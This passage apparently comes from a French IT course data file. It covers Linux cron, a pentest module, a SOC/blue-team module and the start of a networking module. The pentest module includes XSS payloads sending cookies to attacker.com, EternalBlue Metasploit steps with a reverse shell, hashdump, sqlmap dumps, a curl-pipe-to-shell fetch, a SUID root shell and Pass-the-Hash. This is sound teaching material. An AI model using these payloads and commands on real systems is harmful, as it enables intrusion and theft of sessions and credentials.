  30 4 1 * * apt update && apt upgrade -y >> /var/log/apt.log 2>&1

# Crontab système (/etc/cron.d/)
echo "0 3 * * * root /opt/scripts/backup.sh" > /etc/cron.d/backup

# systemd timer (alternative moderne)
# Voir : systemctl list-timers --all`,
        },
        tip: "Redirigez toujours les sorties dans un log : 'commande >> /var/log/job.log 2>&1'. Sans redirection, les erreurs sont envoyées par email local — souvent inaperçues.",
      },
      {
        title: "11. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Linux Debian/Ubuntu. Le QCM couvre tous les modules : installation, permissions, utilisateurs, apt, systemd, SSH, firewall, scripts Bash et cron.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TSSR-Linux.`,
      },
    ],
  },

  "securite-offensive-pentest": {
    slug: "securite-offensive-pentest",
    intro: "Le test d'intrusion (pentest) est une démarche légale et encadrée visant à identifier les vulnérabilités d'un système AVANT qu'un attaquant malveillant ne le fasse. Ce cours couvre la méthodologie complète d'un pentest professionnel, les outils du testeur et les vulnérabilités web les plus courantes selon l'OWASP.",
    sections: [
      {
        title: "1. Cadre légal et méthodologie pentest",
        content: `Un pentest se déroule en 5 phases distinctes. **Sans mandat écrit signé, toute intrusion est illégale** (art. 323-1 du Code pénal).\n\n**Phase 1 — Reconnaissance (OSINT)** : collecte d'informations publiques sur la cible (DNS, WHOIS, réseaux sociaux, job offers, Google Dork).\n\n**Phase 2 — Scan et énumération** : identification des ports ouverts, services, versions logicielles, utilisateurs.\n\n**Phase 3 — Exploitation** : utilisation des vulnérabilités identifiées pour obtenir un accès.\n\n**Phase 4 — Post-exploitation** : élévation de privilèges, persistance, mouvement latéral, exfiltration de données.\n\n**Phase 5 — Rapport** : documentation de toutes les vulnérabilités avec leur criticité (CVSS) et les recommandations de remédiation.`,
        code: {
          lang: "bash",
          code: `# Phase de reconnaissance — collecte OSINT
# Résolution DNS complète
nslookup -type=any cible.fr
dig cible.fr ANY +noall +answer

# Scan de ports (Nmap)
nmap -sV -sC -O -p- --min-rate 5000 -oA scan-cible 192.168.1.0/24
# -sV : détection de version  -sC : scripts par défaut
# -O  : détection OS          -p- : tous les ports

# Enumération web
gobuster dir -u http://cible.fr -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`,
        },
        tip: "⚠️ Ces techniques ne s'utilisent QUE sur des systèmes pour lesquels vous avez une autorisation écrite. En CTF, sur votre lab perso ou dans le cadre d'une mission de pentest signée.",
      },
      {
        title: "2. Reconnaissance et OSINT",
        content: `La reconnaissance (Recon) est la phase initiale du pentest. Elle consiste à collecter un maximum d'informations sur la cible de manière **passive** (sans interaction directe) puis **active** (avec interaction).\n\n**Techniques OSINT passives** :\n- **WHOIS** : propriétaire du domaine, registrar, serveurs DNS\n- **Google Dorks** : filtre la recherche Google (site:, filetype:, inurl:)\n- **Shodan** : moteur de recherche d'appareils connectés (serveurs exposés, caméras, IoT)\n- **TheHarvester** : emails, sous-domaines, IPs via moteurs de recherche\n- **LinkedIn/GitHub** : technologies utilisées, noms d'employés, credentials accidentellement publiés\n\n**Techniques actives** :\n- Scan DNS (sous-domaines via brute-force)\n- Énumération des en-têtes HTTP (technologies, frameworks)`,
        code: {
          lang: "bash",
          code: `# Reconnaissance DNS
nslookup -type=any cible.fr
dig cible.fr ANY +noall +answer
dig cible.fr MX              # serveurs email
dig cible.fr TXT             # enregistrements texte (SPF, DKIM...)

# Sous-domaines (brute-force DNS)
dnsx -d cible.fr -w /usr/share/wordlists/subdomains.txt -silent

# Google Dorks (dans le navigateur)
# site:cible.fr filetype:pdf
# site:cible.fr inurl:admin
# site:cible.fr ext:sql OR ext:bak OR ext:log

# TheHarvester — collecte d'emails et sous-domaines
theHarvester -d cible.fr -b google,bing,linkedin -l 100

# Wayback Machine — pages archivées (peut contenir d'anciens fichiers sensibles)
# curl "https://web.archive.org/cdx/search/cdx?url=cible.fr/*&output=text&fl=original"`,
        },
      },
      {
        title: "3. Scan et énumération (Nmap, Gobuster)",
        content: `La phase d'énumération identifie précisément les services disponibles, leurs versions et les vulnérabilités potentielles. C'est la phase **active** qui laisse des traces dans les logs.\n\n**Nmap** est l'outil de scan réseau de référence. Il permet de détecter les ports ouverts, les services, les versions et le système d'exploitation.\n\n**Gobuster/Feroxbuster** permettent de découvrir des répertoires et fichiers cachés sur les serveurs web par force brute (wordlists).`,
        code: {
          lang: "bash",
          code: `# Nmap — scan progressif
# 1. Scan rapide des ports courants
nmap -sV --top-ports 1000 192.168.1.100

# 2. Scan complet avec scripts par défaut
nmap -sV -sC -O -p- --min-rate 3000 192.168.1.100 -oA scan-complet

# 3. Scripts de vulnérabilités
nmap --script vuln 192.168.1.100
nmap --script smb-vuln* -p 445 192.168.1.100   # vulnérabilités SMB

# Options importantes :
# -sS = SYN scan (furtif)  -sU = UDP  -sV = versions
# -A  = OS + versions + scripts + traceroute
# -oA = export XML+grepable+text  --min-rate = rapidité

# Gobuster — énumération web
gobuster dir \
  -u http://192.168.1.100 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip \
  -t 50 --timeout 10s

# Feroxbuster (alternative plus rapide avec récursion)
feroxbuster -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`,
        },
        tip: "Toujours commencer par un scan rapide (-F ou --top-ports 100) pour avoir un aperçu en 30 secondes, puis lancer le scan complet (-p-) en arrière-plan.",
      },
      {
        title: "4. Injection SQL",
        content: `L'injection SQL est la vulnérabilité web n°1 depuis des années. Elle survient quand des données utilisateur sont directement interpolées dans une requête SQL sans validation ni préparation.\n\n**Conséquences** : extraction de la base de données entière, contournement d'authentification, modification de données, exécution de commandes OS (xp_cmdshell sur SQL Server).\n\n**Détection** : cherchez les paramètres GET/POST injectés dans des requêtes (id=1, user=admin, search=...). Testez avec une apostrophe : si erreur SQL → potentiellement vulnérable.\n\n**Prévention** : requêtes préparées (PreparedStatement), ORM, validation stricte des entrées, principe du moindre privilège sur le compte SQL.`,
        code: {
          lang: "sql",
          code: `-- Exemple de code VULNÉRABLE (NE PAS FAIRE)
-- $query = "SELECT * FROM users WHERE id=" . $_GET['id'];

-- Test basique d'injection
-- URL: /article.php?id=1'   → erreur SQL si vulnérable
-- URL: /article.php?id=1 OR 1=1--   → retourne tous les enregistrements

-- Extraction de la structure (SQLMap automatise ceci)
-- /article.php?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--

-- CODE SÉCURISÉ avec requête préparée (PHP PDO)
-- $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
-- $stmt->execute([$_GET['id']]);`,
        },
      },
      {
        title: "5. XSS et CSRF",
        content: `**XSS (Cross-Site Scripting)** : injection de code JavaScript malveillant dans une page web. Permet le vol de cookies/tokens de session, la redirection vers des sites de phishing, ou le keylogging.\n\n- **XSS Réfléchi** : le payload est dans l'URL, exécuté une seule fois\n- **XSS Stocké** : le payload est sauvegardé en BDD, affecte tous les visiteurs\n- **XSS DOM** : manipulation directe du DOM côté client\n\n**CSRF (Cross-Site Request Forgery)** : forcer un utilisateur authentifié à effectuer une action à son insu (virement bancaire, changement d'email...).\n\n**Prévention XSS** : encoder toutes les sorties HTML, utiliser une CSP stricte, HttpOnly sur les cookies. **Prévention CSRF** : token CSRF unique par formulaire, SameSite=Strict sur les cookies.`,
        code: {
          lang: "javascript",
          code: `// Payload XSS basique (test en lab uniquement)
<script>alert('XSS')</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// Payload XSS avancé — vol de session
<script>
  var i = new Image();
  i.src = "https://attacker.com/log?session=" + document.cookie;
</script>

// PROTECTION côté serveur (Node.js/Express)
const helmet = require('helmet');
app.use(helmet());  // Headers de sécurité dont CSP

// Encodage des sorties (ne jamais insérer des données brutes dans le DOM)
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput);`,
        },
        tip: "En pentest web, utilisez toujours Burp Suite pour intercepter et modifier les requêtes HTTP. C'est l'outil indispensable du testeur web.",
      },
      {
        title: "6. Outils du pentester (Burp Suite, Metasploit)",
        content: `**Burp Suite** (PortSwigger) est le proxy d'interception HTTP indispensable du pentesteur web. Il s'intercale entre le navigateur et le serveur pour intercepter, analyser et modifier toutes les requêtes.\n\n**Modules clés** : Proxy (interception), Repeater (rejouer des requêtes), Intruder (brute-force automatisé), Scanner (vulnérabilités automatiques — version Pro), Decoder, Comparer.\n\n**Metasploit Framework** est la plateforme d'exploitation la plus utilisée au monde. Il contient des milliers d'exploits, payloads et auxiliaires pour tous les systèmes.`,
        code: {
          lang: "bash",
          code: `# Metasploit — utilisation de base
msfconsole                          # démarrer Metasploit

# Dans msfconsole :
search eternalblue                  # chercher un exploit
use exploit/windows/smb/ms17_010_eternalblue
show options                        # paramètres requis
set RHOSTS 192.168.1.50             # cible
set LHOST 192.168.1.10              # notre IP (pour le reverse shell)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit                             # lancer l'exploitation

# Dans une session Meterpreter :
# sysinfo         → informations système
# getuid          → utilisateur actuel
# getsystem       → élévation de privilèges
# hashdump        → extraire les hashes de mots de passe
# run post/multi/recon/local_exploit_suggester

# sqlmap — exploitation automatique SQLi
sqlmap -u "http://cible.fr/page?id=1" --dbs      # lister les bases
sqlmap -u "http://cible.fr/page?id=1" -D webapp --tables  # tables
sqlmap -u "http://cible.fr/page?id=1" -D webapp -T users --dump  # dump`,
        },
      },
      {
        title: "7. Élévation de privilèges Linux/Windows",
        content: `L'élévation de privilèges (PrivEsc) consiste à passer d'un accès bas (utilisateur standard) à un accès élevé (root/SYSTEM). C'est une étape critique de la post-exploitation.\n\n**Linux — vecteurs courants** :\n- **SUID mal configuré** : binaire avec SUID exécuté en root\n- **Sudo misconfiguration** : droits sudo excessifs\n- **Cron jobs** : scripts writables exécutés en root\n- **Kernel exploit** : exploitation d'une vulnérabilité du noyau\n- **PATH hijacking** : remplacer un binaire appelé dans le PATH\n\n**Windows — vecteurs courants** :\n- **Services mal configurés** : binaire remplaçable\n- **DLL hijacking** : DLL manquante dans un chemin contrôlable\n- **AlwaysInstallElevated** : MSI installé en SYSTEM\n- **Token impersonation** : vol de token d'un processus privilégié`,
        code: {
          lang: "bash",
          code: `# Linux PrivEsc — énumération manuelle
id && whoami                            # utilisateur actuel
sudo -l                                 # droits sudo
find / -perm -4000 -type f 2>/dev/null  # binaires SUID
cat /etc/crontab && ls /etc/cron.*      # cron jobs
find / -writable -type f 2>/dev/null | grep -v proc  # fichiers writables

# Outils d'énumération automatique
# LinPEAS (Linux)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Exploitation SUID (exemple : find avec SUID)
# Si find a le bit SUID :
find . -exec /bin/bash -p \;   # shell root

# Windows PrivEsc — WinPEAS
# iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o wp.exe
# .\wp.exe`,
        },
        tip: "GTFOBins (gtfobins.github.io) liste tous les binaires Unix pouvant être utilisés pour l'élévation de privilèges. LOLBAS est son équivalent Windows.",
      },
      {
        title: "8. Post-exploitation et pivoting",
        content: `La post-exploitation commence après avoir obtenu un accès. L'objectif est d'approfondir la compromission, maintenir l'accès et atteindre les objectifs définis dans le mandat.\n\n**Persistance** : créer un mécanisme permettant de retrouver l'accès si la session se ferme (tâche planifiée, service, clé de registre, backdoor SSH).\n\n**Mouvement latéral** : utiliser le premier accès pour compromettre d'autres machines du réseau (Pass-the-Hash, Pass-the-Ticket, credentials réutilisés).\n\n**Pivoting** : utiliser une machine compromise comme relais pour atteindre des réseaux inaccessibles directement.`,
        code: {
          lang: "bash",
          code: `# Pivoting SSH — accéder à 10.10.10.0/24 via 192.168.1.50
# Forward local : accéder à 10.10.10.100:80 via localhost:8080
ssh -L 8080:10.10.10.100:80 user@192.168.1.50

# Dynamic SOCKS proxy — tout le trafic passe par la machine compromise
ssh -D 9050 user@192.168.1.50
# Configurer proxychains.conf : socks4 127.0.0.1 9050
proxychains nmap -sT -Pn 10.10.10.0/24

# Meterpreter — ajout de route
# route add 10.10.10.0/24 [session_id]
# use auxiliary/server/socks_proxy
# set SRVPORT 9050 && run

# Pass-the-Hash (Windows) avec Impacket
python3 psexec.py -hashes :NTLM_HASH Administrateur@192.168.1.100`,
        },
      },
      {
        title: "9. Rédiger un rapport de pentest",
        content: `Un rapport de pentest professionnel comporte obligatoirement :\n\n**1. Résumé exécutif** (2 pages max) : destiné à la direction, sans jargon technique. Synthèse du niveau de sécurité global, risques majeurs, priorités de remédiation.\n\n**2. Résumé technique** : périmètre testé, dates, méthodologie utilisée (OWASP Testing Guide, PTES...), outils employés.\n\n**3. Vulnérabilités détaillées** pour chaque finding :\n- Titre et criticité (Critique/Élevée/Moyenne/Faible) avec score CVSS v3\n- Description technique\n- Preuve (screenshot, log, payload)\n- Impact si exploitée\n- Recommandation de remédiation précise\n\n**4. Annexes** : logs des scans, commandes exécutées, timeline.`,
        tip: "Classez vos vulnérabilités par score CVSS (Common Vulnerability Scoring System). Un score ≥9.0 = Critique, 7-8.9 = Élevé, 4-6.9 = Moyen, <4 = Faible.",
      },
      {
        title: "10. TP — CTF complet guidé",
        content: `Ce TP final vous met dans la peau d'un pentesteur sur une machine vulnérable de type **CTF (Capture The Flag)**. Vous devrez enchaîner toutes les phases vues dans le cours.\n\n**Environnement recommandé** : TryHackMe ou HackTheBox (machines débutant/intermédiaire). Installez Kali Linux comme machine d'attaque.\n\n**Méthodologie à appliquer** :\n1. Reconnaissance OSINT sur la cible\n2. Scan Nmap complet (ports + versions + scripts)\n3. Énumération des services web (Gobuster)\n4. Identification et exploitation d'une vulnérabilité\n5. Élévation de privilèges vers root\n6. Capture du flag et documentation\n\n**Machines recommandées** : TryHackMe "Basic Pentesting", "Mr Robot", "Blue" (EternalBlue) ; HackTheBox "Lame", "Legacy", "Optimum".`,
        tip: "Prenez des notes à chaque étape avec des screenshots. La méthodologie et la documentation sont aussi importantes que le résultat technique en situation réelle.",
      },
      {
        title: "11. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Sécurité Offensive & Pentest. Le QCM couvre : cadre légal, OSINT, Nmap, SQLi, XSS, Burp Suite, PrivEsc, post-exploitation, rapport.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge AIS-Pentest.`,
      },
    ],
  },

  "soc-siem-blue-team": {
    slug: "soc-siem-blue-team",
    intro: "Le SOC (Security Operations Center) est le centre névralgique de la défense cybernétique d'une organisation. Les analystes SOC surveillent en permanence les systèmes pour détecter, analyser et répondre aux incidents de sécurité. Ce cours vous prépare aux métiers de la Blue Team : analyste SOC N1/N2, ingénieur SIEM, répondant aux incidents.",
    sections: [
      {
        title: "1. Architecture d'un SOC",
        content: `Un SOC s'organise en niveaux (tiers) de compétences :\n\n**N1 — Analyste de surveillance** : monitoring en temps réel, triage des alertes, qualification basique (faux positif ou vrai incident ?), escalade vers N2.\n\n**N2 — Analyste d'investigation** : analyse approfondie des incidents, threat hunting, forensics basique, rédaction de rapports d'incident.\n\n**N3 — Expert / Threat Hunter** : reverse engineering, analyse de malwares, règles de détection avancées, réponse aux incidents majeurs (APT).\n\n**Outils piliers d'un SOC** :\n- **SIEM** : collecte et corrélation des logs (Splunk, Wazuh, IBM QRadar)\n- **EDR** : protection endpoint (CrowdStrike, SentinelOne, Defender)\n- **SOAR** : automatisation de la réponse\n- **Threat Intelligence** : IOCs, TTPs des attaquants (MITRE ATT&CK)`,
        tip: "Le framework MITRE ATT&CK est la référence mondiale pour classifier les techniques d'attaque. Apprenez à naviguer sur attack.mitre.org — c'est utilisé dans tous les SOC professionnels.",
      },
      {
        title: "2. Déploiement de Wazuh SIEM",
        content: `**Wazuh** est un SIEM/XDR open-source très utilisé en France (recommandé par l'ANSSI pour les PME). Il se compose d'un **manager** (serveur central), d'**agents** (déployés sur chaque machine à surveiller) et d'un **dashboard** (interface Kibana/OpenSearch).\n\n**Capacités de Wazuh** :\n- Collecte de logs (Syslog, Windows Event Logs, fichiers applicatifs)\n- Détection d'intrusions (règles YARA, Sigma)\n- Vérification d'intégrité des fichiers (FIM)\n- Conformité réglementaire (PCI-DSS, GDPR, HIPAA)\n- Vulnerability assessment`,
        code: {
          lang: "bash",
          code: `# Installation Wazuh Manager (sur Ubuntu 22.04)
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
bash wazuh-install.sh -a  # Installation tout-en-un

# Déployer un agent sur un serveur Linux à surveiller
# Sur le serveur Wazuh manager, générer la commande d'enrôlement :
# Wazuh Dashboard → Agents → Deploy new agent

# Exemple de commande générée (à exécuter sur l'agent)
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb
WAZUH_MANAGER='192.168.1.20' dpkg -i ./wazuh-agent_4.7.0-1_amd64.deb
systemctl enable --now wazuh-agent`,
        },
      },
      {
        title: "3. Analyse de logs et détection",
        content: `L'analyste SOC passe 70% de son temps à analyser des logs. Il faut savoir identifier rapidement les événements anormaux parmi des millions de lignes.\n\n**Logs Windows essentiels** (Event Viewer) :\n- **ID 4624** : connexion réussie\n- **ID 4625** : échec de connexion (brute-force !)\n- **ID 4648** : connexion avec credentials explicites (Pass-the-Hash)\n- **ID 4688** : création de processus\n- **ID 4698** : création de tâche planifiée (persistence !)\n- **ID 7045** : nouveau service installé\n\n**Logs Linux essentiels** :\n- /var/log/auth.log : authentifications SSH, sudo\n- /var/log/syslog : messages système généraux\n- journalctl -u nginx : logs d'un service spécifique`,
        code: {
          lang: "bash",
          code: `# Détecter des tentatives de brute-force SSH dans les logs
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Identifier les connexions SSH réussies depuis des IP inhabituelles
grep "Accepted" /var/log/auth.log | awk '{print $11, $9}' | sort | uniq -c

# Recherche de webshells dans les logs Apache
grep -E "(cmd|exec|system|passthru|shell_exec)" /var/log/apache2/access.log

# Requête Wazuh/KQL — alertes critiques des 24 dernières heures
# level:>= 10 AND timestamp:[now-24h TO now]`,
        },
        tip: "Créez une liste d'IPs/users légitimes dans votre organisation (whitelist). Toute connexion hors whitelist à des heures inhabituelles mérite investigation.",
      },
      {
        title: "4. Threat Hunting avec MITRE ATT&CK",
        content: `Le **Threat Hunting** est une démarche proactive : au lieu d'attendre qu'une alerte se déclenche, l'analyste cherche activement des signes de compromission dans les systèmes.\n\n**MITRE ATT&CK** est une base de connaissances des tactiques et techniques d'attaque réelles utilisées par les groupes APT. Elle s'organise en 14 tactiques (colonnes) et des centaines de techniques/sous-techniques.\n\n**Tactiques principales** : Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Impact.\n\n**Hunt hypotheses** : formulez une hypothèse ("l'attaquant utilise T1059 PowerShell pour la persistance"), cherchez les indicateurs correspondants dans les logs.`,
        code: {
          lang: "bash",
          code: `# Recherche de persistence via tâches planifiées (T1053.005)
# Windows — Event ID 4698 (tâche créée) dans les 7 derniers jours
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698;StartTime=(Get-Date).AddDays(-7)} |
  Select TimeCreated, @{n='Tache';e={$_.Properties[0].Value}}, @{n='Commande';e={$_.Properties[5].Value}}

# Linux — recherche de tâches cron inconnues
find /var/spool/cron /etc/cron* -type f 2>/dev/null | xargs ls -la
# Vérifier les modifications récentes (7 jours)
find /etc/cron* /var/spool/cron -newer /etc/passwd -type f 2>/dev/null

# Recherche de connexions sortantes inhabituelles (T1071 - C2)
# Linux
ss -tnp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort -u
# Windows PowerShell
netstat -anb | Select-String "ESTABLISHED"`,
        },
        tip: "Commencez vos hunts sur les techniques les plus fréquentes : PowerShell (T1059.001), tâches planifiées (T1053), services (T1543), clés de registre Run (T1547.001).",
      },
      {
        title: "5. Réponse à incident (IR)",
        content: `La réponse à incident (Incident Response) est le processus structuré pour contenir, éradiquer et récupérer d'une cyberattaque. Le cadre PICERL est une référence :\n\n1. **Préparation** : runbooks, accès aux outils, contacts d'urgence\n2. **Identification** : détecter et qualifier l'incident (qui, quoi, quand, comment)\n3. **Confinement** : court terme (isoler la machine) puis long terme (colmater le vecteur)\n4. **Éradication** : supprimer la menace (malware, backdoor, compte compromis)\n5. **Récupération** : restaurer les systèmes depuis des sauvegardes saines\n6. **Leçons apprises** : rapport post-incident, amélioration des défenses\n\n**Règle d'or** : isoler AVANT d'analyser. Ne jamais tenter de nettoyer une machine connectée au réseau.`,
        code: {
          lang: "bash",
          code: `# Isolation réseau d'urgence (Linux)
# Couper toutes les connexions sauf SSH de gestion
iptables -I INPUT 1 -s 192.168.1.50 -j ACCEPT   # IP analyste SOC
iptables -I INPUT 2 -j DROP
iptables -I OUTPUT 1 -d 192.168.1.50 -j ACCEPT
iptables -I OUTPUT 2 -j DROP

# Collecte de preuves volatile (RAM d'abord !)
# 1. Processus actifs
ps auxf > /tmp/ir/processes.txt
lsof -n > /tmp/ir/open_files.txt

# 2. Connexions réseau actives
ss -anp > /tmp/ir/network.txt
arp -n > /tmp/ir/arp.txt

# 3. Utilisateurs connectés
w > /tmp/ir/users.txt
last > /tmp/ir/logins.txt

# 4. Dump mémoire RAM (nécessite LiME ou avml)
# avml /tmp/ir/ram.lime

# Compresser et exporter
tar -czf /tmp/triage-$(hostname)-$(date +%Y%m%d).tar.gz /tmp/ir/`,
        },
      },
      {
        title: "6. Forensics Linux/Windows",
        content: `La **forensique numérique** (Digital Forensics) consiste à analyser des systèmes pour reconstituer les actions d'un attaquant et collecter des preuves admissibles.\n\n**Principe de base** : travailler uniquement sur des **copies** (images disque), jamais sur l'original. Utiliser des outils qui n'altèrent pas les métadonnées.\n\n**Artefacts clés Linux** : /var/log/auth.log, .bash_history, /tmp, crontabs, /etc/passwd, fichiers SUID récents, connexions réseau.\n\n**Artefacts clés Windows** : Event Logs (Security/System/Application), Prefetch, Registry (Run keys, UserAssist), MFT ($MFT), LNK files, Recycle Bin, AmCache.`,
        code: {
          lang: "bash",
          code: `# Forensics Linux — artefacts clés
# Timeline des fichiers modifiés dans les 24h
find / -newer /tmp/ir/reference -type f -not -path "/proc/*" 2>/dev/null | head -50

# Historique bash de tous les utilisateurs
find /home /root -name ".bash_history" -exec cat {} \; 2>/dev/null

# Connexions SSH récentes réussies
grep "Accepted" /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}' | tail -50

# Forensics Windows — PowerShell
# Timeline des fichiers récents (7 jours)
Get-ChildItem C:\Users -Recurse -Force 2>$null |
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
  Sort LastWriteTime -Descending | Select FullName, LastWriteTime | head 50

# Clés de registre de persistance (Run keys)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`,
        },
        tip: "Utilisez Volatility3 pour l'analyse de dumps mémoire RAM. Il permet d'extraire les processus, connexions réseau, et secrets en mémoire même depuis une machine éteinte.",
      },
      {
        title: "7. TP — Simulation d'incident complet",
        content: `Ce TP final simule un incident de sécurité de bout en bout. Vous jouez le rôle de l'analyste SOC N2 qui reçoit une alerte Wazuh critique.\n\n**Scénario** : Wazuh alerte sur un nombre anormal d'échecs SSH (ID 5710) depuis l'IP 45.33.32.156, suivi d'une connexion réussie à 03h14. Quelques minutes plus tard, une tâche cron inconnue est détectée.\n\n**Travail à réaliser** :\n1. Qualifier l'alerte : vrai incident ou faux positif ?\n2. Identifier l'étendue de la compromission (quelles machines, quels comptes ?)\n3. Confinement : isoler la machine compromise\n4. Collecte de preuves : logs, artefacts volatils\n5. Éradication : supprimer la backdoor, verrouiller le compte\n6. Rapport d'incident selon le template PICERL\n\n**Environnement suggéré** : TryHackMe room "SOC Level 1" ou Blue Team Labs Online.`,
        tip: "Chronologisez chaque action que vous prenez avec un timestamp. En situation réelle, cette timeline sera demandée par la direction et potentiellement par les autorités.",
      },
      {
        title: "8. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours SOC, SIEM & Blue Team. Le QCM couvre : architecture SOC, Wazuh, analyse de logs, MITRE ATT&CK, réponse à incident, forensics.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge AIS-BlueTeam.`,
      },
    ],
  },

  "reseaux-tcp-ip-vlan": {
    slug: "reseaux-tcp-ip-vlan",
    intro: "La maîtrise des réseaux TCP/IP est la compétence socle de tout technicien systèmes et réseaux. Ce cours couvre le modèle OSI, l'adressage IPv4/IPv6, le routage statique et dynamique (OSPF), la segmentation VLAN et la configuration de switches/routeurs Cisco.",
    sections: [
      {
        title: "1. Modèle OSI et TCP/IP",
        content: `Le modèle OSI (Open Systems Interconnection) découpe les communications réseau en 7 couches indépendantes. En pratique, on utilise le modèle TCP/IP (4 couches) qui est l'implémentation réelle d'Internet.\n\n**Couches OSI** :\n7. **Application** : HTTP, FTP, SMTP, DNS\n6. **Présentation** : chiffrement SSL/TLS, encodage\n5. **Session** : ouverture/fermeture de sessions\n4. **Transport** : TCP (fiable) / UDP (rapide) — ports\n3. **Réseau** : IP, routage, ICMP\n2. **Liaison** : Ethernet, MAC, VLAN (802.1Q)\n1. **Physique** : câbles, fibres, ondes radio\n\n**Mémo** : "Appliquer Précisément Sur le Transport Réseau, les Liens Physiques"`,
        code: {
          lang: "bash",
          code: `# Outils de diagnostic réseau par couche

# Couche 3 — Connectivité IP
ping -c 4 8.8.8.8                    # test de joignabilité
traceroute 8.8.8.8                   # chemin jusqu'à destination
ip route show                        # table de routage Linux

# Couche 4 — Services et ports
ss -tlnp                             # ports en écoute (remplace netstat)
nc -zv 192.168.1.1 80 443           # test d'ouverture de ports

# Couche 2 — ARP et MAC
arp -n                               # table ARP (IP ↔ MAC)
ip neighbor show                     # équivalent moderne

# Capture et analyse de paquets
tcpdump -i eth0 -n port 80 -w capture.pcap
wireshark capture.pcap               # analyse graphique`,
        },
      },
      {
        title: "2. Adressage IPv4 et sous-réseaux (VLSM)",
        content: `La notation CIDR (Classless Inter-Domain Routing) exprime le masque en suffixe : 192.168.1.0**/24** signifie 24 bits de réseau, 8 bits d'hôtes = 254 hôtes utilisables.\n\n**Calcul rapide** :\n- /24 → 256 adresses, 254 hôtes\n- /25 → 128 adresses, 126 hôtes\n- /26 → 64 adresses, 62 hôtes\n- /30 → 4 adresses, 2 hôtes (liens point-à-point)\n\n**VLSM** (Variable Length Subnet Masking) : découper un espace d'adressage en sous-réseaux de tailles différentes selon les besoins réels de chaque segment.`,
        code: {
          lang: "bash",
          code: `# Calculer les sous-réseaux avec ipcalc (Linux)
ipcalc 192.168.10.0/24

# Exemple VLSM — Plan d'adressage pour 192.168.0.0/24 :
# Réseau Direction   : 30 hôtes  → /27 (192.168.0.0/27)
# Réseau Production  : 60 hôtes  → /26 (192.168.0.64/26)
# Réseau WiFi Invités: 100 hôtes → /25 (192.168.0.128/25)
# Lien WAN           : 2 hôtes   → /30 (192.168.0.252/30)

# Vérification avec Python
python3 -c "
import ipaddress
net = ipaddress.IPv4Network('192.168.0.0/27')
print(f'Réseau : {net.network_address}')
print(f'Broadcast : {net.broadcast_address}')
print(f'Hôtes disponibles : {net.num_addresses - 2}')
"`,
        },
      },
      {
        title: "3. VLANs et 802.1Q",
        content: `Un VLAN (Virtual LAN) crée une segmentation logique du réseau sur une infrastructure physique partagée. Les VLANs isolent le trafic, améliorent la sécurité et optimisent les performances.\n\n**Types de ports sur un switch** :\n- **Access** : port connecté à un terminal (PC, imprimante). Appartient à un seul VLAN. La trame Ethernet est non taguée.\n- **Trunk** : port entre switches ou vers un routeur. Transporte plusieurs VLANs. Les trames sont taguées 802.1Q (ajout d'un champ VLAN ID de 12 bits).\n\n**Inter-VLAN routing** : les VLANs ne peuvent pas communiquer entre eux par défaut. Il faut un routeur ou un switch de niveau 3 (router-on-a-stick ou SVI).`,
        code: {
          lang: "text",
          code: `! Configuration Cisco IOS — VLANs

! Créer les VLANs
Switch(config)# vlan 10
Switch(config-vlan)# name DIRECTION
Switch(config)# vlan 20
Switch(config-vlan)# name PRODUCTION
Switch(config)# vlan 99
Switch(config-vlan)# name MANAGEMENT

! Port Access (PC connecté)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10

! Port Trunk (vers un autre switch ou routeur)
Switch(config)# interface GigabitEthernet0/24
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan 10,20,99

! Vérification
Switch# show vlan brief
Switch# show interfaces trunk`,
        },
        tip: "Placez toujours vos ports non utilisés dans un VLAN 'poubelle' (ex: VLAN 999) et désactivez-les. Un port non utilisé en VLAN 1 par défaut est une faille de sécurité.",
      },
      {
        title: "4. Routage OSPF",
        content: `**OSPF** (Open Shortest Path First) est un protocole de routage dynamique à état de liens (Link State). Chaque routeur construit une carte complète du réseau (LSDB) et calcule les meilleures routes avec l'algorithme de Dijkstra (SPF).\n\n**Concepts clés** :\n- **Area 0** (backbone) : toutes les zones OSPF doivent se connecter à l'area 0\n- **Router ID** : identifiant unique du routeur (IP en notation décimale)\n- **Cost** : métrique = 100 Mbps / bande passante du lien (FastEthernet=1, T1=64)\n- **DR/BDR** : Designated Router / Backup DR sur les réseaux multi-accès (Ethernet)\n- **Adjacence** : deux routeurs OSPF doivent d'abord devenir voisins avant d'échanger leur LSDB`,
        code: {
          lang: "text",
          code: `! Configuration OSPF sur routeur Cisco IOS

Router(config)# router ospf 1
